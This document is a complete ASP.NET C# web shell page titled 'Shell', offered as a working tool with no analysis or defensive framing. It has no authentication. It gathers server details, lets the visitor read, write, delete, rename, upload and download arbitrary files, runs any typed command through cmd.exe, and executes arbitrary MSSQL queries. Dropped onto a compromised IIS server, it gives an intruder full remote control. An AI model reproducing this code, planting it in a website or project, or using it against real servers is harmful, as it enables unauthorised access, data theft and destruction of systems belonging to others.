<%@ Page Language="C#" Debug="true" ValidateRequest="false" %>

<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Security.AccessControl" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Collections" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        GetServerInfo();
        SetActionVisibility();
        SetDirectoryPath();
    }

    private void GetServerInfo()
    {
        ltlOsVersion.Text = Environment.OSVersion.ToString();
        ltl64Bit.Text = Environment.Is64BitOperatingSystem ? "Yes" : "No";
        ltlDotNetVersion.Text = GetDotNetVersion();
        ltlMachineName.Text = Environment.MachineName;
        ltlUserDomainName.Text = Environment.UserDomainName;
        ltlUserName.Text = Environment.UserName;
        ltlCurrentDirectory.Text = Environment.CurrentDirectory;
        ltlRootDirectory.Text = GetRootDir();
        ltlLogicalDrives.Text = string.Join(", ", Environment.GetLogicalDrives());
        ltlServerSoftware.Text = Request.ServerVariables["SERVER_SOFTWARE"];
        ltlIp.Text = Request.ServerVariables["LOCAL_ADDR"];
    }

    private void SetActionVisibility()
    {
        if (string.IsNullOrEmpty(action.Value))
            return;

        divServerInfo.Style.Value = action.Value == "server" ? "display: block" : "display: none";
        divFileBrowser.Style.Value = action.Value == "browser" ? "display: block" : "display: none";
        divFileUploader.Style.Value = action.Value == "uploader" ? "display: block" : "display: none";
        divCmd.Style.Value = action.Value == "cmd" ? "display: block" : "display: none";
        divSql.Style.Value = action.Value == "sql" ? "display: block" : "display: none";
    }

    private void SetDirectoryPath()
    {
        txtFileUploaderDirectory.Text = GetRootDir();
    }

    private void ExecuteCommand_Click(object sender, EventArgs e)
    {
        string cmdResult;
        var process = new Process();

        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + txtCmd.Text;
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.WorkingDirectory = GetRootDir();
        try
        {
            process.Start();
            cmdResult = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
        }
        catch (Exception ex)
        {
            cmdResult = ex.Message;
        }

        ltlCmdOut.Text = cmdResult;
    }

    private void FileUploader_Click(object sender, EventArgs e)
    {
        ltlFileUploaderOutput.Text = "";

        if (!fupFileUploader.HasFile)
            return;

        try
        {
            fupFileUploader.SaveAs(txtFileUploaderDirectory.Text + fupFileUploader.FileName);
            ltlFileUploaderOutput.Text = "File: '" + fupFileUploader.FileName + "' uploaded";
        }
        catch (Exception ex)
        {
            ltlFileUploaderOutput.Text = ex.Message;
        }
    }

    private string GetRootDir()
    {
        return Request.MapPath(".") + "\\";
    }

    public static string GetDotNetVersion()
    {
        var releaseKey = GetReleaseKey();

        if (releaseKey >= 461808)
        {
            return "4.7.2 or later";
        }
        if (releaseKey >= 461308)
        {
            return "4.7.1 or later";
        }
        if (releaseKey >= 460798)
        {
            return "4.7 or later";
        }
        if (releaseKey >= 394802)
        {
            return "4.6.2 or later";
        }
        if (releaseKey >= 394254)
        {
            return "4.6.1 or later";
        }
        if (releaseKey >= 393295)
        {
            return "4.6 or later";
        }
        if (releaseKey >= 393273)
        {
            return "4.6 RC or later";
        }
        if ((releaseKey >= 379893))
        {
            return "4.5.2 or later";
        }
        if ((releaseKey >= 378675))
        {
            return "4.5.1 or later";
        }
        if ((releaseKey >= 378389))
        {
            return "4.5 or later";
        }
        // This line should never execute. A non-null release key should mean 
        // that 4.5 or later is installed. 
        return "No 4.5 or later version detected";
    }

    private static int GetReleaseKey()
    {
        using (var ndpKey = Microsoft.Win32.RegistryKey.OpenBaseKey(
            Microsoft.Win32.RegistryHive.LocalMachine,
            Microsoft.Win32.RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
        {
            if (ndpKey == null || ndpKey.GetValue("Release") == null)
                return 0;

            int result;
            int.TryParse(ndpKey.GetValue("Release").ToString(), out result);
            return result;
        }
    }

    private void FileBrowse_Click(object sender, EventArgs e)
    {
        var path = txtFileBrowserDirectory.Text;
        var mode = ((Button)sender).ID;

        ltlFileBrowserOutput.Text = "";
        if (mode == "btnRead")
        {
            txtFileBrowserResultList.Text = ReadFile(path);
        }
        else if (mode == "btnWrite")
        {
            txtFileBrowserResultList.Text = (WriteFile(path, txtFileBrowserResultList.Text)) ? " Saved. " : " Failed. ";
        }
        else if (mode == "btnRemove")
        {
            txtFileBrowserResultList.Text = (RemoveFile(path)) ? " Removed. " : " Failed. ";
        }
        else if (mode == "btnRename")
        {
            txtFileBrowserResultList.Text = (RenameFile(path, txtFileBrowserResultList.Text)) ? " Renamed. " : " Failed. ";
        }
        else if (mode == "btnMakeDir")
        {
            txtFileBrowserResultList.Text = (MakeDir(path)) ? " Created. " : " Failed. ";
        }
        else if (mode == "btnDownload")
        {
            DownloadFile(path);
        }
    }

    private string ReadFile(string path)
    {
        if (!File.Exists(path))
        {
            return "Can't access file: " + path;
        }

        try
        {
            var data = string.Empty;
            using (var reader = new StreamReader(path, Encoding.UTF8))
            {
                data = reader.ReadToEnd();
                reader.Close();
            }

            return data;
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
    }

    private bool WriteFile(string path, string text)
    {
        if (Directory.Exists(path))
            return false;

        try
        {
            using (var writer = new StreamWriter(path, false, Encoding.UTF8))
            {
                writer.Write(text);
                writer.Close();
            }

            return true;
        }
        catch (Exception ex)
        {
            txtFileBrowserResultList.Text = ex.ToString();
            return false;
        }
    }

    private bool RemoveFile(string path)
    {
        try
        {
            if (File.Exists(path))
                File.Delete(path);
            else if (Directory.Exists(path))
                Directory.Delete(path);
            else
                return false;
            return true;
        }
        catch (Exception ex)
        {
            txtFileBrowserResultList.Text = ex.ToString();
            return false;
        }
    }

    private bool RenameFile(string path, string new_path)
    {
        try
        {
            if (File.Exists(path))
                File.Move(path, new_path);
            else if (Directory.Exists(path))
                Directory.Move(path, new_path);
            else
                return false;

            return true;
        }
        catch (Exception ex)
        {
            txtFileBrowserResultList.Text = ex.ToString();
            return false;
        }
    }

    private bool MakeDir(string path)
    {
        try
        {
            Directory.CreateDirectory(path);
            return true;
        }
        catch (Exception ex)
        {
            txtFileBrowserResultList.Text = ex.ToString();
            return false;
        }
    }

    private void DownloadFile(string path)
    {
        if (Directory.Exists(path))
            return;

        var fileName = path.Split('\\')[(path.Split('\\').Length - 1)];

        Response.ClearContent();
        Response.ContentType = "application/force-download";
        Response.AppendHeader("Content-Disposition", "attachment; filename=" + fileName);
        Response.TransmitFile(path);
        Response.End();
    }

    private void SqlExecute_Click(object sender, EventArgs e)
    {
        var query = txtSqlQuery.Text;

        try
        {
            using (var command = new SqlCommand())
            {
                command.CommandText = query;
                command.CommandType = CommandType.Text;

                using (var connection = new SqlConnection())
                {
                    command.Connection = connection;
                    connection.ConnectionString = txtSqlConnectionString.Text;
                    connection.Open();

                    if (query.Trim().ToUpper().StartsWith("SELECT") || query.Trim().ToUpper().StartsWith("SHOW"))
                    {
                        using (var sql_reader = command.ExecuteReader())
                        {
                            ltlSqlOutput.Text = SqlRead(sql_reader);
                        }
                    }
                    else
                    {
                        ltlSqlOutput.Text = SqlExec(command);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            ltlSqlOutput.Text = "<b>" + ex.Message + "</b>";
            return;
        }
    }

    private string SqlRead(SqlDataReader reader)
    {
        var sqlDataResult = new StringBuilder();
        sqlDataResult.Append("<br><table>");
        sqlDataResult.Append("<tr>");

        for (int i = 0; i < reader.FieldCount; i++)
            sqlDataResult.Append("<th>" + reader.GetName(i) + "</th>");

        sqlDataResult.Append("<tr>");

        while (reader.Read())
        {
            sqlDataResult.Append("<tr>");

            for (int i = 0; i < reader.FieldCount; i++)
            {
                sqlDataResult.Append("<td>" + Server.HtmlDecode(reader[i].ToString()) + "</td>");
            }
            sqlDataResult.Append("</tr>");
        }

        sqlDataResult.Append("</table>");

        return sqlDataResult.ToString();
    }
    private string SqlExec(SqlCommand command)
    {
        int i;
        var sqlResult = command.ExecuteNonQuery().ToString();

        if (Int32.TryParse(sqlResult, out i))
            return "<b>SQL query executed successfully. " + sqlResult + "<b>";

        return sqlResult;
    }
</script>
<script type="text/javascript">
    function showOption(option) {
        document.getElementById('action').value = option;

        document.getElementById('divServerInfo').style.display = option == 'server' ? 'block' : 'none';
        document.getElementById('divFileBrowser').style.display = option == 'browser' ? 'block' : 'none';
        document.getElementById('divFileUploader').style.display = option == 'uploader' ? 'block' : 'none';
        document.getElementById('divCmd').style.display = option == 'cmd' ? 'block' : 'none';
        document.getElementById('divSql').style.display = option == 'sql' ? 'block' : 'none';
    }

    function cmd_onfocus(field) {
        if (field.value === 'Type the command here....') {
            field.value = '';
        }
    }
</script>
<html>
<head>
    <title>Shell</title>
    <style>
        .div-right {
            margin-left: 150px;
        }
    </style>
</head>
<body>
    <form id="main_form" runat="server">
        <asp:HiddenField runat="server" ID="action" />
        <div style="float: left; margin-right: 20px">
            <b>Menu</b>
            <ol>
                <li>
                    <a href="" onclick="javascript:showOption('server');return false;">Server Info</a>
                </li>
                <li>
                    <a href="" onclick="javascript:showOption('browser');return false;">File Browser</a>
                </li>
                <li>
                    <a href="" onclick="javascript:showOption('uploader');return false;">File Uploader</a>
                </li>
                <li>
                    <a href="" onclick="javascript:showOption('cmd');return false;">Cmd</a>
                </li>
                <li>
                    <a href="" onclick="javascript:showOption('sql');return false;">MSSQL Queries</a>
                </li>
            </ol>
        </div>
        <div>
            <div runat="server" id="divServerInfo" class="div-right" style="display: block">
                <b>Server Info</b>
                <br />
                <br />
                <div style="float: left; margin-right: 20px">
                    <label>OS Version: </label>
                    <br />
                    <label>OS 64bit: </label>
                    <br />
                    <label>Installed .Net Version: </label>
                    <br />
                    <label>MachineName: </label>
                    <br />
                    <label>UserDomainName: </label>
                    <br />
                    <label>UserName: </label>
                    <br />
                    <label>CurrentDirectory: </label>
                    <br />
                    <label>Root Directory: </label>
                    <br />
                    <label>Logical Drives: </label>
                    <br />
                    <label>Server Software: </label>
                    <br />
                    <label>IP: </label>
                    <br />
                </div>
                <div>
                    <asp:Literal runat="server" ID="ltlOsVersion" /><br />
                    <asp:Literal runat="server" ID="ltl64Bit" /><br />
                    <asp:Literal runat="server" ID="ltlDotNetVersion" /><br />
                    <asp:Literal runat="server" ID="ltlMachineName" /><br />
                    <asp:Literal runat="server" ID="ltlUserDomainName" /><br />
                    <asp:Literal runat="server" ID="ltlUserName" /><br />
                    <asp:Literal runat="server" ID="ltlCurrentDirectory" /><br />
                    <asp:Literal runat="server" ID="ltlRootDirectory" /><br />
                    <asp:Literal runat="server" ID="ltlLogicalDrives" /><br />
                    <asp:Literal runat="server" ID="ltlServerSoftware" /><br />
                    <asp:Literal runat="server" ID="ltlIp" /><br />
                </div>
            </div>

            <div runat="server" id="divFileBrowser" class="div-right" style="display: none">
                <b>File Browser</b>
                <br />
                <br />
                <asp:TextBox runat="server" ID="txtFileBrowserDirectory" Width="400" />
                <asp:Button runat="server" ID="btnRead" OnClick="FileBrowse_Click" Text="Read" />
                <asp:Button runat="server" ID="btnWrite" OnClick="FileBrowse_Click" Text="Write" />
                <asp:Button runat="server" ID="btnRemove" OnClick="FileBrowse_Click" Text="Remove" />
                <asp:Button runat="server" ID="btnRename" OnClick="FileBrowse_Click" Text="Rename / Move" />
                <asp:Button runat="server" ID="btnMakeDir" OnClick="FileBrowse_Click" Text="Make Dir" />
                <asp:Button runat="server" ID="btnDownload" OnClick="FileBrowse_Click" Text="Download" />
                &nbsp;&nbsp;&nbsp;<b><asp:Literal runat="server" ID="ltlFileBrowserOutput" Mode="PassThrough" /></b>
                <pre><asp:TextBox id="txtFileBrowserResultList" TextMode="multiline" Columns="120" Rows="50" runat="server" /></pre>
            </div>

            <div runat="server" id="divFileUploader" class="div-right" style="display: none">
                <b>File Uploader</b>
                <br />
                <br />
                <label>Directory: </label>
                <asp:TextBox runat="server" ID="txtFileUploaderDirectory" Width="400" />
                <br />
                <br />
                <asp:FileUpload runat="server" ID="fupFileUploader" />
                <asp:Button runat="server" ID="btnFileUploader" OnClick="FileUploader_Click" Text="Upload!" />
                &nbsp;&nbsp;&nbsp;<b><asp:Literal runat="server" ID="ltlFileUploaderOutput" Mode="PassThrough" /></b>
            </div>

            <div runat="server" id="divCmd" class="div-right" style="display: none">
                <b>Web Shell Remote Execution</b>
                <br />
                <br />
                <asp:TextBox runat="server" ID="txtCmd" Text="Type the command here...." onfocus="cmd_onfocus(this)" Width="500" />
                <asp:Button runat="server" ID="btnRunCmd" OnClick="ExecuteCommand_Click" Text="Execute command" />
                <pre><asp:Literal runat="server" ID="ltlCmdOut" Mode="Encode" /></pre>
            </div>

            <div runat="server" id="divSql" class="div-right" style="display: none">
                <b>MSSQL SQL Queries</b>
                <br />
                <br />
                <b>
                    <label>Connection String:</label></b><br />
                <asp:TextBox runat="server" ID="txtSqlConnectionString" Width="450" Value="" />
                <br />
                <br />
                <b>
                    <label>Query:</label></b><br />
                <asp:TextBox runat="server" ID="txtSqlQuery" Value="" Width="450" />
                <asp:Button runat="server" ID="btnSqlExecute" OnClick="SqlExecute_Click" Text="Execute Query" />
                <div>
                    <asp:Literal runat="server" ID="ltlSqlOutput" Text="" />
                </div>
            </div>
        </div>
    </form>
</body>
</html>
